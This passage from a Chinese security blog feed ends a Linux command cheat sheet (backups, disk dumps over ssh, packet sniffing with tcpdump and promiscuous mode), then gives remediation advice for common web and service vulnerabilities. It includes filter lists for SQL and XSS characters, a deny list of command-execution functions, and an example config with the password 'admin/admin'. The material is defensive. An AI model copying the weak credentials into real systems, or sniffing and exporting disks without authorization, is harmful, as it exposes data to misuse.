-rogpav -e ssh --delete /home ip_address:/tmp           #通过SSH通道rsync<br>rsync -az -e ssh --delete ip_addr:/home/public /home/local    #通过ssh和压缩将一个远程目录同步到本地目录<br>rsync -az -e ssh --delete /home/local ip_addr:/home/public    #通过ssh和压缩将本地目录同步到远程目录<br><br>dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr &#x27;dd of=hda.gz&#x27;  <br>#通过ssh在远程主机上执行一次备份本地磁盘的操作<br>dd if=/dev/sda of=/tmp/file1 <br>#备份磁盘内容到一个文件<br>tar -Puf backup.tar /home/user 执行一次对 &#x27;/home/user&#x27; <br>#目录的交互式备份操作<br>( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr &#x27;cd /home/share/ &amp;&amp; tar x -p&#x27; <br>#通过ssh在远程目录中复制一个目录内容<br>( tar c /home ) | ssh -C user@ip_addr &#x27;cd /home/backup-home &amp;&amp; tar x -p&#x27; <br>#通过ssh在远程目录中复制一个本地目录<br>tar cf - . | (cd /tmp/backup ; tar xf - ) <br>#本地将一个目录复制到另一个地方，保留原有权限及链接<br><br>find /home/user1 -name &#x27;*.txt&#x27; | xargs cp -av --target-directory=/home/backup/ --parents <br>#从一个目录查找并复制所有以 &#x27;.txt&#x27; 结尾的文件到另一个目录<br>find /var/log -name &#x27;*.log&#x27; | tar cv --files-from=- | bzip2 &gt; log.tar.bz2 <br>#查找所有以 &#x27;.log&#x27; 结尾的文件并做成一个bzip包<br><br>dd if=/dev/hda of=/dev/fd0 bs=512 count=1 <br>#做一个将 MBR (Master Boot Record)内容复制到软盘的动作<br>dd if=/dev/fd0 of=/dev/hda bs=512 count=1 <br>#从已经保存到软盘的备份中恢复MBR内容<br></code></pre></td></tr></table></figure><h2 id="光盘">光盘</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force <br>#清空一个可复写的光盘内容<br><br>mkisofs /dev/cdrom &gt; cd.iso             #在磁盘上创建一个光盘的iso镜像文件<br>mkisofs /dev/cdrom | gzip &gt; cd_iso.gz    #在磁盘上创建一个压缩了的光盘iso镜像文件<br>mkisofs -J -allow-leading-dots -R -V &quot;Label CD&quot; -iso-level 4 -o ./cd.iso data_cd <br>#创建一个目录的iso镜像文件<br>cdrecord -v dev=/dev/cdrom cd.iso               #刻录一个ISO镜像文件<br>gzip -dc cd_iso.gz | cdrecord dev=/dev/cdrom -  #刻录一个压缩了的ISO镜像文件<br>mount -o loop cd.iso /mnt/iso                  #挂载一个ISO镜像文件<br><br>cd-paranoia -B             #从一个CD光盘转录音轨到 wav 文件中<br>cd-paranoia -- &quot;-3&quot;        #从一个CD光盘转录音轨到 wav 文件中（参数-3）<br>cdrecord --scanbus         #扫描总线以识别scsi通道<br>dd if=/dev/hdc | md5sum    #校验一个设备的md5sum编码，例如一张 CD<br></code></pre></td></tr></table></figure><h2 id="网络-（以太网和WIFI无线）">网络 - （以太网和WIFI无线）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ifconfig eth0    #显示一个以太网卡的配置<br>ifup eth0        #启用一个 &#x27;eth0&#x27; 网络设备<br>ifdown eth0      #禁用一个 &#x27;eth0&#x27; 网络设备<br>ifconfig eth0 192.168.1.1 netmask 255.255.255.0     #控制IP地址<br>ifconfig eth0 promisc     #设置 &#x27;eth0&#x27; 成混杂模式以嗅探数据包 (sniffing)<br>dhclient eth0            #以dhcp模式启用 &#x27;eth0&#x27;<br><br>route -n    #查看路由表<br>route add -net 0/0 gw IP_Gateway    #配置默认网关<br>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 <br>#配置静态路由到达网络&#x27;192.168.0.0/16&#x27;<br>route del 0/0 gw IP_gateway        #删除静态路由<br><br>hostname #查看机器名<br>host www.example.com       #把一个主机名解析到一个网际地址或把一个网际地址解析到一个主机名。<br>nslookup www.example.com   #用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题。<br>ip link show            #查看网卡信息<br>mii-tool                #用于查看、管理介质的网络接口的状态<br>ethtool                 #用于查询和设置网卡配置<br>netstat -tupl           #用于显示TCP/UDP的状态信息<br>tcpdump tcp port 80     #显示所有http协议的流量<br></code></pre></td></tr></table></figure><h2 id="JPS工具">JPS工具</h2><p>jps(Java Virtual Machine Process Status Tool)是JDK 1.5提供的一个显示当前所有java进程pid的命令，简单实用，非常适合在linux/unix平台上简单察看当前java进程的一些简单情况。</p><p>使用方法：在当前命令行下打 jps(需要JAVA_HOME，没有的话，到改程序的目录下打) 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jps存放在JAVA_HOME/bin/jps，使用时为了方便请将JAVA_HOME/bin/加入到Path.<br>$&gt; jps<br>23991 Jps<br>23789 BossMain<br>23651 Resin<br><br>比较常用的参数：<br><br>#-q 只显示pid，不显示class名称,jar文件名和传递给main 方法的参数<br>$&gt; jps -q<br>28680<br>23789<br>23651<br><br>#-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null<br>$&gt; jps -m<br>28715 Jps -m<br>23789 BossMain<br>23651 Resin -socketwait 32768 -stdout /data/aoxj/resin/log/stdout.log -stderr /data/aoxj/resin/log/stderr.log<br><br>#-l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名<br>$&gt; jps -l<br>28729 sun.tools.jps.Jps<br>23789 com.asiainfo.aimc.bossbi.BossMain<br>23651 com.caucho.server.resin.Resin<br><br>#-v 输出传递给JVM的参数<br>$&gt; jps -v<br><br>23789 BossMain<br><br>28802 Jps -Denv.class.path=/data/aoxj/bossbi/twsecurity/java/trustwork140.jar:/data/aoxj/bossbi/twsecurity/java/:/data/aoxj/bossbi/twsecurity/java/twcmcc.jar:/data/aoxj/jdk15/lib/rt.jar:/data/aoxj/jd<br><br>k15/lib/tools.jar -Dapplication.home=/data/aoxj/jdk15 -Xms8m<br><br>23651 Resin -Xss1m -Dresin.home=/data/aoxj/resin -Dserver.root=/data/aoxj/resin -Djava.util.logging.manager=com.caucho.log.LogManagerImpl -<br><br>Djavax.management.builder.initial=com.caucho.jmx.MBeanServerBuilderImpl<br><br><br>jps 192.168.0.77<br>#列出远程服务器192.168.0.77机器所有的jvm实例，采用rmi协议，默认连接端口为1099（前提是远程服务器提供jstatd服务）<br><br>#注：jps命令有个地方很不好，似乎只能显示当前用户的java进程，要显示其他用户的还是只能用unix/linux的ps命令<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞修复建议大全</title>
      <link href="/2023/02/02/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%E5%A4%A7%E5%85%A8/"/>
      <url>/2023/02/02/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%E5%A4%A7%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="SQL注入">SQL注入</h2><p>修改Web应用服务的软件部分，增加对客户端提交数据的合法性验证，至少严格过滤SQL语句中的关键字，并且所有验证都应该在服务器端实现，以防客户端（IE页面代码部分）控制被绕过。</p><p>验证GET、POST、COOKIE等方法中URL后面跟的参数，需过滤的关键字为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[1] &#x27; 单引号<br>[2] &quot; 双引号<br>[3] &#x27; 反斜杠单引号<br>[4] &quot; 反斜杠双引号<br>[5] ) 括号<br>[6] ; 分号<br>[7] -- 双减号<br>[8] + 加号<br>[9]SQL关键字，如select，delete，drop等等，注意对于关键字要对大小写都识别，如:select ;SELECT;seLEcT等都应识别<br></code></pre></td></tr></table></figure><p>建议降低Web应用访问使用较低权限的用户访问数据库。不要使用数据库管理员等高权限的用户访问数据库。</p><h2 id="弱口令">弱口令</h2><p>1、用户登录后需要对初始口令进行修改，防止攻击者利用初始口令进行暴力破解。</p><p>2、系统设置强密码策略，建议用户密码采用10位以上数字加大小写字母。</p><p>3、对密码暴力猜解行为进行图灵验证，一旦发现用户口令破解行为及时对账户进行限时封停处理。</p><h2 id="未授权访问">未授权访问</h2><p>1、对于每个功能的访问，需要明确授予特定角色的访问权限。</p><p>2、如果某功能参与了工作流程，检查并确保当前的条件是授权访问此功能的合适状态。</p><h2 id="XSS跨站脚本攻击">XSS跨站脚本攻击</h2><p>建议过滤的关键字为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[1] &#x27; 单引号<br>[2] &quot; 双引号<br>[3] / 斜杠<br>[4] \ 反斜杠<br>[5] ) 括号<br>[6] ; 分号<br>[7] [ 中括号<br>[8] &lt; 尖括号<br>[9] &gt; 尖括号<br>比如把&lt;编码为&lt;<br></code></pre></td></tr></table></figure><p>在cookie中加入httponly属性可以在一定程度上保护用户的cookie，减少出现XSS时损失。</p><h2 id="目录列表">目录列表</h2><p>1、对于apache服务器，在apache配置文件httpd.conf中，从Options中删除Indexes。</p><p>2、对于IIS服务器，禁用目录浏览属性。</p><h2 id="CVE-2019-0708远程代码执行">CVE-2019-0708远程代码执行</h2><p>1、及时打对应系统的安全补丁</p><p>2、关闭3389端口或添加防火墙安全策略限制对3389端口的访问</p><p>3、打不了补丁的可以开启远程桌面（网络级别身份验证(NLA)），可以临时防止漏洞攻击</p><h2 id="Apache-Tomcat文件包含-CNVD-2020-10487-CVE-2020-1938">Apache Tomcat文件包含(CNVD-2020-10487/CVE-2020-1938)</h2><p>目前，Apache 官方已发布 9.0.31、8.5.51 及 7.0.100 版本对此漏洞进行修 复，建议用户尽快升级新版本：</p><p><a href="https://tomcat.apache.org/download-70.cgi">https://tomcat.apache.org/download-70.cgi</a></p><p><a href="https://tomcat.apache.org/download-80.cgi">https://tomcat.apache.org/download-80.cgi</a></p><p><a href="https://tomcat.apache.org/download-90.cgi">https://tomcat.apache.org/download-90.cgi</a></p><p>如果暂时无法升级最新版本，可采取临时缓解措施：</p><h6 id="1、如未使用-Tomcat-AJP-协议：">1、如未使用 Tomcat AJP 协议：</h6><p>如未使用 Tomcat AJP 协议，可以直接将 Tomcat 升级到 9.0.31、8.5.51 或 7.0.100 版本进行漏洞修复。</p><p>如无法立即进行版本更新、或者是更老版本的用户，建议直接关闭 AJPCon nector，或将其监听地址改为仅监听本机 localhost。</p><p>具体操作：</p><p>（1）编辑 Code: [[“”, [], []], “&lt;CATALINA_BASE&gt;”]/conf/server.xml，找到如下行（Code: [[“”, [], []], “&lt;CATALINA_B ASE&gt;”]为 Tomcat 的工作目录）：</p><p>&lt;Connector port=&quot;8009&quot;protocol=“AJP/1.3” redirectPort=“8443” /&gt;</p><p>（2）将此行注释掉（也可删掉该行）：</p><p>（3）保存后需重新启动，规则方可生效。</p><h6 id="2、如果使用了-Tomcat-AJP-协议：">2、如果使用了 Tomcat AJP 协议：</h6><p>建议将 Tomcat 立即升级到 9.0.31、8.5.51 或 7.0.100 版本进行修复，同时 为 AJP Connector 配置 secret 来设置 AJP 协议的认证凭证。例如（注意必须将 Y OUR_TOMCAT_AJP_SECRET 更改为一个安全性高、无法被轻易猜解的值）：</p><p>```</p><p>&lt;Connector port=&quot;8009&quot;protocol=“AJP/1.3” redirectPort=&quot;8443&quot;address=“YO UR_TOMCAT_IP_ADDRESS” secret=“YOUR_TOMCAT_AJP_SECRET”/&gt;</p><p>```</p><p>如无法立即进行版本更新、或者是更老版本的用户，建议为 AJPConnector 配置 requiredSecret 来设置 AJP 协议认证凭证。例如（注意必须将 YOUR_TOMC AT_AJP_SECRET 更改为一个安全性高、无法被轻易猜解的值）：</p><p>```&lt;Connector port=&quot;8009&quot;protocol=“AJP/1.3” redirectPort=&quot;8443&quot;address=&quot;YO UR_TOMCAT_IP_ADDRESS&quot;requiredSecret=“YOUR_TOMCAT_AJP_SECRET” /&gt;</p><p>```</p><h2 id="信息泄露">信息泄露</h2><p>1、对身份验证时传输的用户名密码等作加密处理，为了防止重放攻击可以在验证时加个随机数，以保证验证单次有效。</p><p>2、关闭错误输出，防止调试信息泄露，或者当web应用程序出错时，统一返回一个错误页面或直接跳转至首页</p><p>3、合理设置服务器端各种文件的访问权限</p><p>4、尽量避免跨域的数据传输，对于同域的数据传输使用xmlhttp的方式作为数据获取的方式，依赖于javascript在浏览器域里的安全性保护数据。如果是跨域的数据传输，必须要对敏感的数据获取做权限认证，例如对referer的来源做限制，加入token等</p><h2 id="任意文件上传">任意文件上传</h2><p>处理用户上传文件，要做以下检查：</p><p>1、 检查上传文件扩展名白名单，不属于白名单内，不允许上传。</p><p>2、 上传文件的目录必须是http请求无法直接访问到的。如果需要访问的，必须上传到其他（和web服务器不同的）域名下，并设置该目录为不解析jsp等脚本语言的目录。</p><p>3、 上传文件要保存的文件名和目录名由系统根据时间生成，不允许用户自定义。</p><p>4、 图片上传，要通过处理（缩略图、水印等），无异常后才能保存到服务器。</p><h2 id="任意文件下载或读取">任意文件下载或读取</h2><p>1、对相应参数进行过滤，依次过滤“.”、“…”、“/”、“”等字符。</p><p>2、或者对于下载文件的目录做好限制，只能下载指定目录下的文件，或者将要下载的资源文件路径存入数据库，附件下载时指定数据库中的id即可，id即对应的资源。</p><h2 id="命令执行注入">命令执行注入</h2><p>1、尽量避免使用exec、system、passthru、popen、shell_exec、eval、execute、assert等此类执行命令/执行代码相关函数。</p><p>2、执行代码/命令的参数，或文件名，不要使用外部获取，禁止和用户输入相关，只能由开发人员定义代码内容，用户只能提交“1、2、3”参数，代表相应代码，防止用户构造。</p><h2 id="短信炸弹">短信炸弹</h2><p>1、限制每个手机号的每日发送次数，超过次数则拒发送，提示超过当日次数。</p><p>2、每个ip限制最大限制次数。超过次数则拒发送，提示超过ip当日发送最大次数。</p><p>3、限制每个手机号发送的时间间隔，比如两分钟，没超过2分钟，不允许发送，提示操作频繁。</p><p>4、应具有页面图片验证码、IP访问次数限制功能!</p><h2 id="垂直越权访问">垂直越权访问</h2><p>1、对于每个功能的访问，需要明确授予特定角色的访问权限。</p><p>2、如果某功能参与了工作流程，检查并确保当前的条件是授权访问此功能的合适状态。</p><h2 id="CSRF-跨站请求伪造">CSRF 跨站请求伪造</h2><p>1、验证 HTTP Referer 字段</p><p>2、在请求地址中增加 csrftoken 验证，csrftoken 可以在用户登录后产生并放于 session 之中，然后在每次请求时把 csrftoken 从 session 中拿出，与请求中的 csrftoken 进行比对。对于 GET 请求，csrftoken 将附在请求地址之后，对于 POST 请求来说，要在 form 的最后加上 <code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;；</code></p><p>3、在 HTTP 头中自定义属性并验证。</p><p>4、对于 web 站点，将持久化的授权方法（例如 cookie 或者 HTTP 授权）切换为瞬时的授权方法（在每个 form 中提供隐藏 field），可以帮助网站防止 CSRF 攻击。</p><p>5、过滤用户输入，不允许发布含有站内操作 URL 的链接；</p><p>6、在浏览其它站点前登出站点或者在浏览器会话结束后清理浏览器的 cookie。</p><h2 id="CORS-跨域漏洞">CORS 跨域漏洞</h2><ol><li>正确配置跨域请求, 如果 Web 资源包含敏感信息，则应在 Access-Control-Allow-Origin 标头中正确指定来源。</li><li>只允许信任的网站, Access-Control-Allow-Origin 中指定的来源只能是受信任的站点。使用通配符来表示允许的跨域请求的来源而不进行验证很容易被利用，应该避免。</li><li>避免将 null 列入白名单, 避免使用标题 Access-Control-Allow-Origin: null。来自内部文档和沙盒请求的跨域资源调用可以指定 null 来源。应针对私有和公共服务器的可信来源正确定义 CORS 头。</li><li>避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅靠信任网络配置来保护内部资源是不够的。</li><li>CORS 不能替代服务器端安全策略, CORS 定义了浏览器的行为，绝不能替代服务器端对敏感数据的保护 - 攻击者可以直接从任何可信来源伪造请求。因此，除了正确配置的 CORS 之外，Web 服务器还应继续对敏感数据应用保护，例如身份验证和会话管理。</li></ol><h2 id="SlowHttp-缓慢攻击漏洞">SlowHttp 缓慢攻击漏洞</h2><ol><li>设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率。</li><li>增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported。</li><li>默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接。</li><li>将标题和消息体限制在最小的合理长度上。针对接受数据的每个资源，设置更严格的特定于 URL 的限制。</li><li>如果 Web 服务器从相同的 IP 接收到数千个连接，同一个用户代理在短时间内请求相同的资源，直接禁掉 IP 并且记录日志。</li><li>对 web 服务器的 http 头部传输的最大许可时间进行限制，修改成最大许可时间为 20 秒。</li></ol><ul><li><p>Weblogic</p></li><li><ol><li>在配置管理界面中的协议 -&gt; 一般信息下设置 完成消息超时时间小于 400。</li><li>在配置管理界面中的协议 -&gt;HTTP 下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。</li></ol></li><li><p>Nginx</p></li><li><ol><li>通过调整 $request_method，配置服务器接受 http 包的操作限制；</li><li>在保证业务不受影响的前提下，调整 client_max_body_size, client_body_buffer_size, client_header_buffer_size,large_client_header_buffersclient_body_timeout, client_header_timeout 的值，必要时可以适当的增加；</li><li>对于会话或者相同的 ip 地址，可以使用 HttpLimitReqModule and HttpLimitZoneModule 参数去限制请求量或者并发连接数；</li><li>根据 CPU 和负载的大小，来配置 worker_processes 和 worker_connections 的值，公式是：max_clients = worker_processes * worker_connections。</li></ol></li><li><p>Apache</p></li><li><ol><li><p>mod_reqtimeout 用于控制每个连接上请求发送的速率。配置例如： 请求正文部分，设置超时时间初始为 10 秒，将超时时间延长 1 秒，但最长不超过 40 秒。可以防护 slow message body 型的慢速攻击。</p></li><li><p>mod_qos 用于控制并发连接数。配置例如：</p><p>当服务器并发连接数超过 600 时，关闭 keepalive QS_SrvMaxConnClose 600 每个源 IP 最大并发连接数为 50 QS_SrvMaxConnPerIP 50</p></li></ol></li></ul><h2 id="log4j2-CVE-2021-44228-远程代码执行漏洞">log4j2(CVE-2021-44228)远程代码执行漏洞</h2><p>1、设置系统环境变量 LOG4J_log4j2_formatMsgNoLookups=True</p><p>2、升级 Apache Log4j2 相关应用到最新版本，地址 <a href="https://github.com/apache/logging-log4j2/tags">https://github.com/apache/logging-log4j2/tags</a></p><h2 id="Struts2-反序列化漏洞">Struts2 反序列化漏洞</h2><p>1、请及时安装 Struts2 中间件的最新版本 <a href="http://struts.apache.org/download.cgi">http://struts.apache.org/download.cgi</a></p><h2 id="iis-短文件名泄露漏洞">iis 短文件名泄露漏洞</h2><p>修改 Windows 配置，关闭短文件名功能。</p><ol><li><p>关闭 NTFS 8.3 文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p></li><li><p>如果是虚拟主机空间用户, 可采用以下修复方案：</p></li><li><ul><li>修改注册列表 HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation 的值为 1(此修改只能禁止 NTFS8.3 格式文件名创建, 已经存在的文件的短文件名无法移除)。</li><li>如果你的 web 环境不需要 <a href="http://asp.net">asp.net</a> 的支持你可以进入 Internet 信息服务 (IIS) 管理器 — Web 服务扩展 - <a href="http://ASP.NET">ASP.NET</a> 选择禁止此功能。</li><li>升级 net framework 至 4.0 以上版本。</li><li>将 web 文件夹的内容拷贝到另一个位置，比如 D:\www 到 D:\www.back，然后删除原文件夹 D:\www，再重命名 D:\www.back 到 D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。</li></ul></li></ol><h2 id="Elasticsearch-未授权访问漏洞">Elasticsearch 未授权访问漏洞</h2><p>1、限制 IP 访问，绑定固定 IP。</p><p>2、在 config/elasticsearch.yml 中为9200端口设置认证。</p><h2 id="Kibana-未授权访问漏洞">Kibana 未授权访问漏洞</h2><p>1、设置防火墙策略，仅允许指定的 IP 来访问服务。</p><p>2、通过 nginx 设置反向代理，设置密码登录验证。</p><p>3、设置 kibana 监听本地地址，并设置 ElasticSearch 登录的账号和密码。</p><p>4、使用 htpasswd 创建 kibana 登录的账号密码，这里可以复用 ElasticSearch 创建的账号密码，也可以重新创建一 个。</p><p>5、配置 nginx 反向代理，配置好后，重启 nginx 和 kibana，通过 15601 登录验证访问 Kibana。</p><h2 id="Shiro-反序列化">Shiro 反序列化</h2><p>1、对于 shiro 应用,管理员需及时关注官方的安全公告 <a href="https://issues.apache.org/jira/projects/SHIRO/issues">https://issues.apache.org/jira/projects/SHIRO/issues</a></p><h2 id="Druid-Monitor-未授权访问">Druid Monitor 未授权访问</h2><p>做好权限的控制，不允许未登录的用户直接访问 Druid Monitor 页面。</p><h2 id="Spring-Actuator-组件未授权访问">Spring Actuator 组件未授权访问</h2><p>1、禁用所有接口，将配置改为: endpoints.enable=false</p><p>2、引入 spring-boot-starter-security 依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;dependency&gt;<br>    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>    &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>3、在application.properties中指定actuator的端口以及开启security功能，配置访问权限验证，这时再访问actuator功能时就会弹出登录窗口，需要输入账号密码验证后才允许访问。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">management.port=8099<br>management.security.enabled=true<br>security.user.name=admin<br>security.user.password=admin<br></code></pre></td></tr></table></figure><h2 id="solr-未授权访问漏洞">solr 未授权访问漏洞</h2><p>1、添加 Apache Solr 访问权限控制。</p><p>2、禁止外网或白名单以外的 IP 访问 solr/admin 目录。</p><h2 id="Redis-未授权访问漏洞">Redis 未授权访问漏洞</h2><p>1、禁用一些高危命令,常见如：flushdb，flushall，config，keys 等。</p><p>2、禁止使用 root 权限启动 redis 服务，以低权限运行 Redis 服务。</p><p>3、对 redis 访问启动密码认证。</p><p>4、禁止外网访问 Redis。</p><p>5、添加 IP 访问限制，并更改默认 6379 端口。</p><p>6、保证 authorized_keys 文件的安全。</p><h2 id="Mongodb-未授权访问漏洞">Mongodb 未授权访问漏洞</h2><p>1、为 MongoDB 添加认证：MongoDB 启动时添加 --auth 参数、为 MongoDB 添加用户。</p><p>2、MongoDB 自身带有一个 HTTP 服务和并支持 REST 接口。在2.6以后这些接口默认是关闭的。mongoDB 默认会使用默认端口监听 web 服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择 -nohttpinterface 参数 nohttpinterface=false。</p><p>3、启动时加入参数 --bind_ip 127.0.0.1 或在 /etc/mongodb.conf 文件中添加以下内容：bind_ip = 127.0.0.1。</p><h2 id="Memcahce-未授权访问">Memcahce 未授权访问</h2><ol><li>配置 memcached 监听本地回环地址 127.0.0.1。 vim /etc/sysconfig/memcached OPTIONS=“-l 127.0.0.1” # 设置本地为监听 /etc/init.d/memcached restart # 重启服务</li><li>当 memcached 配置为监听内网 IP 或公网 IP 时， 使用主机防火墙(iptalbes、 firewalld 等)和 网络防火墙对 memcached 服务端口 进行过滤。</li></ol><h2 id="VNC-未授权">VNC 未授权</h2><p>1、设置 VNC 服务的密码。</p><p>2、限制白名单 IP 连接到对应的 VNC 端口。</p><h2 id="SMB弱口令">SMB弱口令</h2><ol><li>不要使用常见的弱口令作为密码。</li><li>定期修改密码。</li><li>及时 SMB 服务更新到最新版本。</li><li>对采用白名单的方式，仅允许授权主机 IP 访问该端口，避免漏洞被攻击者恶意利用。</li></ol><h2 id="Hadoop-未授权访问漏洞">Hadoop 未授权访问漏洞</h2><ol><li>如无必要，关闭 Hadoop Web 管理页面。</li><li>开启身份验证，防止未经授权用户访问。</li><li>设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口。</li></ol><h2 id="ZooKeeper-未授权访问漏洞">ZooKeeper 未授权访问漏洞</h2><ol><li>修改 ZooKeeper 默认端口，采用其他端口服务。</li><li>添加访问控制，配置服务来源地址限制策略。</li><li>增加 ZooKeeper 的认证配置。</li></ol><h2 id="Docker-Remote-API-未授权访问漏洞">Docker Remote API 未授权访问漏洞</h2><ol><li>修改 Docker Remote API 服务默认参数。</li><li>修改 Docker 的启动参数：定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1 或将默认端口 2375 改为自定义端口为 Remote API 设置认证措施。</li><li>设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。</li><li>修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。</li></ol><p>总之、不要将端口直接暴露在公网，内网中使用需要设置严格的访问规则.</p><h2 id="Kubelet-未授权访问">Kubelet 未授权访问</h2><ol><li>将 Kubelet 组件的启动参数 --anonymous-auth 值设为 false，即不允许匿名访问</li><li>将 Kubelet 组件的启动参数 --authorization-mode 值设为 Webhook</li><li>如非业务需要，可以关闭 Web 端口的服务，保持最小化原则，避免安全风险的产生。</li></ol><h2 id="Kubernetes-API-Server-未授权访问">Kubernetes API Server 未授权访问</h2><p>1、禁止在 Kubernetes APIServer 组件的配置文件中修改 --insecure-port 启动参数值为 8080，使用默认配置值</p><p>2、禁止在 Kubernetes APIServer 组件的配置文件中修改 --insecure-bind-address 启动参数值为 0.0.0.0，使用默认配置值</p><p>3、使用 API Server 的安全端口（6443），并为其设置证书</p><h2 id="MS17-010">MS17-010</h2><p>针对 MS17-010 漏洞，微软官方已放出相应的补丁，建议及时安装官方补丁:<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</a></p><h2 id="CVE-2019-0708">CVE-2019-0708</h2><p>针对 CVE-2019-0708 漏洞，Microsoft 已经为此发布了一个安全公告以及相应补丁: <a href="https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2019-0708">https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2019-0708</a> <a href="https://support.microsoft.com/en-us/help/4500331/windows-update-kb4500331">https://support.microsoft.com/en-us/help/4500331/windows-update-kb4500331</a></p><h2 id="FTP-弱口令">FTP 弱口令</h2><ol><li>不要使用常见的弱口令作为密码。</li><li>定期修改密码。</li><li>及时 FTP 服务更新到最新版本。</li><li>对采用白名单的方式，仅允许授权主机 IP 访问该端口，避免漏洞被攻击者恶意利用。</li></ol><h2 id="FTP匿名登录">FTP匿名登录</h2><ol><li>关闭匿名访问。</li><li>不要使用常见的弱口令作为密码。</li><li>定期修改密码。</li><li>及时 ftp 服务更新到最新版本。</li><li>采用白名单的方式，仅允许授权主机 IP 访问该端口，避免漏洞被攻击者恶意利用。</li></ol><h2 id="SSH-弱口令">SSH 弱口令</h2><ol><li>修改口令，增加口令复杂度，如包含大小写字母、数字和特殊字符等。</li><li>修改默认口令，避免默认口令被猜解。</li><li>指定健壮的口令策略，比如指定每隔30天修改一次密码，密码不得与历史密码相同。</li><li>采用白名单的方式，仅允许授权主机 IP 访问该端口，避免漏洞被攻击者恶意利用。</li></ol><h2 id="数据库弱口令">数据库弱口令</h2><ol><li>修改口令，增加口令复杂度，如包含大小写字母、数字和特殊字符等。</li><li>修改默认口令，避免默认口令被猜解。</li><li>指定健壮的口令策略，比如指定每隔30天修改一次密码，密码不得与历史密码相同。</li><li>采用白名单的方式，仅允许授权主机 IP 访问该端口，避免漏洞被攻击者恶意利用。</li></ol><h2 id="任意文件包含">任意文件包含</h2><ol><li>配置文件：在配置文件中限制访问的文件目录，比如 PHP 中 php.ini 配置 open_basedir。</li><li>特殊字符过滤：检查用户输入，过滤或转义含有“…/”、“…\”、“%00”，“…”，“./”，“#”等跳转目录或字符终止符、截断字符的输入。</li><li>合法性判断：严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等。</li><li>白名单：白名单限定访问文件的路径、名称及后缀名。</li></ol><h2 id="svn-源码泄露漏洞">svn 源码泄露漏洞</h2><p>1、查找服务器上所有 .svn 隐藏文件夹，删除。</p><p>2、开发人员在使用 SVN 时，严格使用导出功能。禁止直接复制代码。</p><h2 id="git-源码泄漏">.git 源码泄漏</h2><ol><li>查找服务器上所有 .git 隐藏文件夹，删除。</li><li>中间件上设置 .git 目录访问权限，禁止访问。</li></ol><h2 id="DS-Store-信息泄漏">DS_Store 信息泄漏</h2><ol><li>在不影响代码运行的情况下，删除 .DS_Store 文件。</li><li>在中间件中设置对应的文件、目录的访问权限。</li></ol><h2 id="Swagger-API-泄露">Swagger API 泄露</h2><ol><li>对该页面加上授权访问检查。</li><li>鉴权，服务端对请求的数据和当前用户身份做校验;完善基础安全架构，完善用户权限体系。</li><li>对于后台接口，确保所有 API 接口先经过登录控制器。</li><li>在验证用户身份权限前不进行任何数据的交互。</li></ol><h2 id="XXE">XXE</h2><ul><li><p>使用语言中推荐的禁用外部实体的方法</p></li><li><ul><li>from lxml import etree</li><li>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</li><li>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</li><li>dbf.setExpandEntityReferences(false);</li><li>PHP：libxml_disable_entity_loader(true);</li><li>Java:</li><li>Python:</li></ul></li><li><p>手动黑名单过滤</p></li><li><ul><li>过滤 XML 